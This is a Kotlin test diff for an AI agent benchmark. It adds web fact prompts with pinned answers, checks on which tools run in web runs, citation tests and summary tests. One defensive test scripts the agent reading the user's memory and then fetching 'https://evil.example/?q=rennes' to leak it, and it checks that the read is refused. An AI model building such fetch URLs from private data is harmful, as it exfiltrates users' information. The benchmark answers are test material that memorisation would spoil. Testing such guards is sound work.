@@ -43,6 +43,7 @@ class AgentBenchTest {
         override val name: String,
         override val tier: ToolTier = ToolTier.Local,
         override val sendsOrDeletes: Boolean = false,
+        private val output: String? = null,
     ) : Tool {
         override val description = "test tool"
         override val parametersSchema = """{"type":"object","properties":{}}"""
@@ -50,7 +51,7 @@ class AgentBenchTest {
 
         override suspend fun execute(argsJson: String): ToolResult {
             runs++
-            return ToolResult.ok("ran $name")
+            return ToolResult.ok(output ?: "ran $name")
         }
     }
 
@@ -81,9 +82,10 @@ class AgentBenchTest {
         system: ((Set<String>) -> String?)? = null,
         sampling: SamplingConfig = SamplingConfig(),
         toolPolicy: ToolPolicy = ToolPolicy.Current,
+        web: Boolean = false,
     ): BenchRunner {
         // Every tier granted: the bench refuses a network call whatever the user granted.
-        val registry = ToolRegistry(tools.map(::BenchTool)) { ToolTier.entries.toSet() }
+        val registry = ToolRegistry(tools.map { BenchTool(it, web) }) { ToolTier.entries.toSet() }
         var now = 0L
         return BenchRunner(
             // No wait for a busy queue: the turn ends on the first refusal.
@@ -94,6 +96,7 @@ class AgentBenchTest {
             countTokens = { it.length },
             clock = { now += 5; now },
             system = system,
+            web = web,
         )
     }
 
@@ -1071,5 +1074,251 @@ class AgentBenchTest {
         assertNull(benchTrigger(debug = true, bench = "agent", thinking = false, defaultThinking = true, reasoningBudget = 256)!!.reasoningBudget)
         assertNull(benchTrigger(debug = true, bench = "agent", thinking = null, defaultThinking = true, reasoningBudget = 0)!!.reasoningBudget)
         assertNull(benchTrigger(debug = true, bench = "agent", thinking = null, defaultThinking = true)!!.reasoningBudget)
+    }
+
+    @Test
+    fun theWebListAsksItsTenFactsTaggedWebEachWithAnAnswer() {
+        val prompts = parseBenchPrompts(File("src/debug/assets/bench/agent-web-prompts.json").readText())
+        val byId = prompts.associateBy { it.id }
+
+        assertEquals(
+            listOf(
+                "rennes-metro-b", "millau-height", "saturn-moons", "loire-length", "roazhon-capacity",
+                "skytree-vs-eiffel", "android-16-date", "tdf-2024", "jwst-launch", "iceland-pop",
+            ),
+            prompts.map { it.id },
+        )
+        assertTrue(prompts.all { it.tags == setOf("web") && it.expected == setOf("web_search", "web_fetch") && it.answer != null && it.maxTokens == null })
+        assertEquals("In which year did line b of the Rennes metro open? Search the web.", byId.getValue("rennes-metro-b").prompt)
+        // Pinned to the March 2025 count: later pages give more.
+        assertEquals("How many moons did Saturn have after the IAU recognized 128 new ones in March 2025? Look it up online.", byId.getValue("saturn-moons").prompt)
+        assertEquals(AnswerCheck.Number(274.0), byId.getValue("saturn-moons").answer)
+        // The Eiffel Tower is 324 or 330 m, antenna or not.
+        assertEquals(AnswerCheck.Number(304.0, 10.0), byId.getValue("skytree-vs-eiffel").answer)
+        assertEquals(AnswerCheck.Number(29778.0, 600.0), byId.getValue("roazhon-capacity").answer)
+        assertEquals(AnswerCheck.Number(383726.0, 2000.0), byId.getValue("iceland-pop").answer)
+        // A date holds written either way.
+        assertEquals(AnswerCheck.Text("June 10", listOf("10 June")), byId.getValue("android-16-date").answer)
+        assertEquals(AnswerCheck.Text("December 25", listOf("25 December")), byId.getValue("jwst-launch").answer)
+        assertEquals(AnswerCheck.Text("Pogacar"), byId.getValue("tdf-2024").answer)
+    }
+
+    @Test
+    fun theWebListIsAskedByNameAndAnythingElseReadsTheAgentList() {
+        fun list(name: String?) = benchTrigger(debug = true, bench = "agent", thinking = null, defaultThinking = true, promptList = name)!!.promptList
+
+        assertEquals(BenchPromptList.Web, list("web"))
+        assertEquals(BenchPromptList.Agent, list(null))
+        assertEquals(BenchPromptList.Agent, list("other"))
+        assertTrue(BenchPromptList.Web.runsWeb)
+        assertFalse(BenchPromptList.Agent.runsWeb)
+    }
+
+    @Test
+    fun onlyAWebRunRunsTheWebToolsUnaskedAndEveryOtherToolKeepsItsPolicy() = runBlocking {
+        assertFalse(benchRuns("web_search", """{"query":"x"}"""))
+        assertFalse(benchRuns("web_fetch", """{"url":"https://a.org/"}"""))
+        assertTrue(benchRuns("web_search", """{"query":"x"}""", web = true))
+        assertTrue(benchRuns("web_fetch", """{"url":"https://a.org/"}""", web = true))
+        assertFalse(benchRuns("weather", "{}", web = true))
+        assertFalse(benchRuns("set_timer", """{"seconds":600}""", web = true))
+        assertTrue(benchRuns("wikipedia", """{"query":"x"}""", web = true))
+        assertFalse(benchRuns("wikipedia", """{"query":"x"}"""))
+        assertFalse(benchRuns("memory", """{"action":"remember","text":"x"}""", web = true))
+        // Nothing that reads the phone: a fetch runs unasked, its URL could carry what the read returned.
+        assertFalse(benchRuns("memory", """{"action":"list"}""", web = true))
+        assertFalse(benchRuns("device_info", "{}", web = true))
+        assertTrue(benchRuns("device_info", "{}"))
+        assertTrue(benchRuns("calculate", "{}", web = true))
+
+        val search = FakeTool("web_search", ToolTier.Network)
+        // Asks, as web_fetch does for a link the model built.
+        val fetch = FakeTool("web_fetch", ToolTier.Network, sendsOrDeletes = true)
+        val weather = FakeTool("weather", ToolTier.Network)
+        val timer = FakeTool("set_timer", ToolTier.PhoneAction)
+        val calculate = FakeTool("calculate")
+        // Five calls, the runtime's cap for a turn.
+        val gen = ScriptedGenerator(
+            reply(
+                "",
+                calls = listOf(
+                    ToolCall("1", "web_search", """{"query":"x"}"""),
+                    ToolCall("2", "web_fetch", """{"url":"https://a.org/"}"""),
+                    ToolCall("3", "weather", "{}"),
+                    ToolCall("4", "set_timer", """{"seconds":600}"""),
+                    ToolCall("5", "calculate", """{"expression":"1+1"}"""),
+                ),
+            ),
+            reply("done"),
+        )
+
+        val result = runner(search, fetch, weather, timer, calculate, generator = gen, web = true).run(prompt("fact", "web_search"))
+
+        assertEquals(1, search.runs)
+        assertEquals(1, fetch.runs)
+        assertEquals(0, weather.runs)
+        assertEquals(0, timer.runs)
+        assertEquals(1, calculate.runs)
+        assertEquals(listOf("weather", "set_timer"), result.refused)
+    }
+
+    @Test
+    fun aWebRunCountsTheSearchesAndFetchesAndWhetherTheReplyCitesWhatTheyRead() = runBlocking {
+        val search = FakeTool(
+            "web_search",
+            ToolTier.Network,
+            output = "1. Millau Viaduct\n   https://en.wikipedia.org/wiki/Millau_Viaduct\n   A cable-stayed bridge.\nsource: DuckDuckGo",
+        )
+        val fetch = FakeTool("web_fetch", ToolTier.Network)
+        fun script() = ScriptedGenerator(
+            reply("", calls = listOf(ToolCall("1", "web_search", """{"query":"millau viaduct height"}"""))),
+            reply(
+                "",
+                calls = listOf(
+                    ToolCall("2", "web_fetch", """{"url":"https://www.viaduc-millau.fr/en/structure"}"""),
+                    ToolCall("3", "web_fetch", """{"url":"https://en.wikipedia.org/wiki/Millau_Viaduct"}"""),
+                ),
+            ),
+            reply("343 m, per en.wikipedia.org."),
+        )
+
+        val result = runner(search, fetch, generator = script(), web = true).run(prompt("millau", "web_search", "web_fetch"))
+
+        val web = result.web!!
+        assertEquals(1, web.searches)
+        assertEquals(2, web.fetches)
+        assertEquals(listOf("https://www.viaduc-millau.fr/en/structure", "https://en.wikipedia.org/wiki/Millau_Viaduct"), web.fetchedUrls)
+        assertEquals(listOf("viaduc-millau.fr", "en.wikipedia.org"), web.fetchedHosts)
+        assertEquals(setOf("https://en.wikipedia.org/wiki/Millau_Viaduct"), web.sourceUrls)
+        assertTrue(web.citesSource)
+        val line = Json.parseToJsonElement(result.toLogLine()).jsonObject
+        assertEquals("1", line.getValue("web_search").jsonPrimitive.content)
+        assertEquals("2", line.getValue("web_fetch").jsonPrimitive.content)
+        assertEquals("0", line.getValue("wikipedia").jsonPrimitive.content)
+        assertEquals(listOf("viaduc-millau.fr", "en.wikipedia.org"), line.getValue("fetched_hosts").jsonArray.map { it.jsonPrimitive.content })
+        assertEquals("true", line.getValue("cites_source").jsonPrimitive.content)
+
+        // Outside a web run the same turn, its web calls refused, logs none of it.
+        val agent = runner(search, fetch, generator = script()).run(prompt("millau", "web_search", "web_fetch"))
+        assertNull(agent.web)
+        val agentLine = Json.parseToJsonElement(agent.toLogLine()).jsonObject
+        listOf("web_search", "web_fetch", "wikipedia", "fetched_hosts", "cites_source").forEach { assertFalse(it, it in agentLine) }
+    }
+
+    @Test
+    fun aWebRunCountsItsWikipediaCallsAndTheArticleLinkIsASource() = runBlocking {
+        val wikipedia = FakeTool(
+            "wikipedia",
+            ToolTier.Network,
+            output = "Loire (longest river in France)\nThe Loire is 1,006 km long.\nhttps://en.wikipedia.org/wiki/Loire\nsource: Wikipedia, CC BY-SA",
+        )
+        val gen = ScriptedGenerator(
+            reply("", calls = listOf(ToolCall("1", "wikipedia", """{"query":"Loire"}"""))),
+            reply("1,006 km (en.wikipedia.org/wiki/Loire)."),
+        )
+
+        val result = runner(wikipedia, generator = gen, web = true).run(prompt("loire", "web_search", "web_fetch"))
+
+        assertEquals(1, wikipedia.runs)
+        assertEquals(emptyList<String>(), result.refused)
+        val web = result.web!!
+        assertEquals(1, web.wikipedia)
+        assertEquals(0, web.searches)
+        assertEquals(setOf("https://en.wikipedia.org/wiki/Loire"), web.sourceUrls)
+        assertTrue(web.citesSource)
+        assertEquals("1", Json.parseToJsonElement(result.toLogLine()).jsonObject.getValue("wikipedia").jsonPrimitive.content)
+    }
+
+    @Test
+    fun aWebRunRefusesAMemoryListSoABuiltFetchCannotCarryItOut() = runBlocking {
+        val memory = FakeTool("memory", output = "1. lives in Rennes")
+        val fetch = FakeTool("web_fetch", ToolTier.Network, sendsOrDeletes = true)
+        val gen = ScriptedGenerator(
+            reply("", calls = listOf(ToolCall("1", "memory", """{"action":"list"}"""))),
+            reply("", calls = listOf(ToolCall("2", "web_fetch", """{"url":"https://evil.example/?q=rennes"}"""))),
+            reply("done"),
+        )
+
+        val result = runner(memory, fetch, generator = gen, web = true).run(prompt("fact", "web_search"))
+
+        assertEquals(0, memory.runs)
+        assertEquals(listOf("memory"), result.refused)
+    }
+
+    @Test
+    fun aReplyCitesASourceByItsUrlOrDomainNotBySiteNameInWords() {
+        val sources = listOf("https://en.wikipedia.org/wiki/Loire", "https://www.britannica.com/place/Loire-River")
+
+        assertTrue(citesSource("1,006 km (https://en.wikipedia.org/wiki/Loire)", sources))
+        assertTrue(citesSource("About 1,006 km, see britannica.com.", sources))
+        assertTrue(citesSource("www.Britannica.com gives 1,012 km.", sources))
+        // A parent of the host, as a reply shortens it.
+        assertTrue(citesSource("Source: Wikipedia.org", sources))
+        assertFalse(citesSource("According to Wikipedia, 1,006 km.", sources))
+        assertFalse(citesSource("1,006 km (lemonde.fr)", sources))
+        assertFalse(citesSource("Version 3.14, e.g. 1.5 km in the U.S.", sources))
+        assertFalse(citesSource(null, sources))
+        assertFalse(citesSource("en.wikipedia.org", emptyList()))
+        // A host written with its trailing root dot is the same host.
+        assertTrue(citesSource("see example.com", listOf("https://example.com./page")))
+        assertEquals(listOf("example.com"), BenchWeb(0, 1, listOf("https://www.example.com./page"), emptySet(), citesSource = false).fetchedHosts)
+    }
+
+    @Test
+    fun aTextAnswerTakesAlternativesAnyOfWhichHoldsIt() {
+        val (one, several) = parseBenchPrompts(
+            """{"version":1,"prompts":[
+                {"id":"a","prompt":"q","expected":"none","answer":{"text":"Tokyo"}},
+                {"id":"b","prompt":"q","expected":"none","answer":{"text":["June 10","10 June"]}}
+            ]}""",
+        ).map { it.answer }
+        assertEquals(AnswerCheck.Text("Tokyo"), one)
+        assertEquals(AnswerCheck.Text("June 10", listOf("10 June")), several)
+        assertTrue(runCatching { parseBenchPrompts("""{"version":1,"prompts":[{"id":"c","prompt":"q","expected":"none","answer":{"text":[]}}]}""") }.isFailure)
+
+        val date = AnswerCheck.Text("June 10", listOf("10 June"))
+        assertTrue(date.matches("Android 16 went stable on June 10, 2025."))
+        assertTrue(date.matches("It was released on 10 June 2025."))
+        assertFalse(date.matches("It was released on 11 June 2025."))
+        assertFalse(date.matches("June 2025"))
+        assertEquals("june 10 | 10 june", date.shown)
+        assertEquals("tokyo", AnswerCheck.Text("Tokyo").shown)
+    }
+
+    @Test
+    fun aWebRunNeedsTheInternetTierAndASearchProviderWithItsKey() {
+        assertNull(webBenchBlocker(ToolTier.entries.toSet(), searchReady = true))
+        assertTrue(webBenchBlocker(setOf(ToolTier.Local), searchReady = true)!!.startsWith("Internet tools are not granted"))
+        assertTrue(webBenchBlocker(setOf(ToolTier.Network), searchReady = false)!!.contains("API key"))
+    }
+
+    @Test
+    fun theSummaryOfAWebRunGivesItsFetchRateAndCitationsAndAnAgentRunNeither() {
+        fun web(fetches: Int, cites: Boolean, verdict: BenchVerdict = BenchVerdict.Correct) =
+            result(setOf("web_search"), verdict, 1, 1).copy(web = BenchWeb(1, fetches, List(fetches) { "https://a$it.org/" }, emptySet(), cites))
+        val results = listOf(web(2, cites = true), web(0, cites = false), web(1, cites = false), web(0, cites = false), web(1, cites = true, BenchVerdict.Error))
+        val trigger = BenchTrigger(thinking = true, promptList = BenchPromptList.Web)
+
+        val summary = BenchSummary.of(results)
+
+        // The error is left out: 2 of 4 fetched, 1 of 4 cited.
+        assertEquals(0.5, summary.fetchRate!!, 0.0)
+        assertEquals(1 to 4, summary.citesSource)
+        val line = Json.parseToJsonElement(summary.toLogLine(trigger)).jsonObject
+        assertEquals("web", line.getValue("prompt_list").jsonPrimitive.content)
+        assertEquals("0.5", line.getValue("fetch_rate").jsonPrimitive.content)
+        assertEquals("1", line.getValue("cites_source").jsonPrimitive.content)
+        assertEquals("4", line.getValue("cites_source_of").jsonPrimitive.content)
+        val shown = summary.toDisplayLines(trigger, "m", results)
+        assertTrue(shown[1].endsWith(" · list web"))
+        assertTrue(shown.toString(), "fetch_rate 0.5 · cites_source 1/4" in shown)
+        assertTrue(shown.toString(), "fetched p: https://a0.org/ https://a1.org/" in shown)
+
+        val agent = BenchSummary.of(listOf(result(emptySet(), BenchVerdict.Correct, 1, 1)))
+        assertNull(agent.fetchRate)
+        assertNull(agent.citesSource)
+        val agentLine = Json.parseToJsonElement(agent.toLogLine(BenchTrigger(thinking = true))).jsonObject
+        listOf("prompt_list", "fetch_rate", "cites_source", "cites_source_of").forEach { assertFalse(it, it in agentLine) }
+        assertTrue(agent.toDisplayLines(BenchTrigger(thinking = true), "m", emptyList()).none { "fetch" in it || "list" in it })
     }
 }
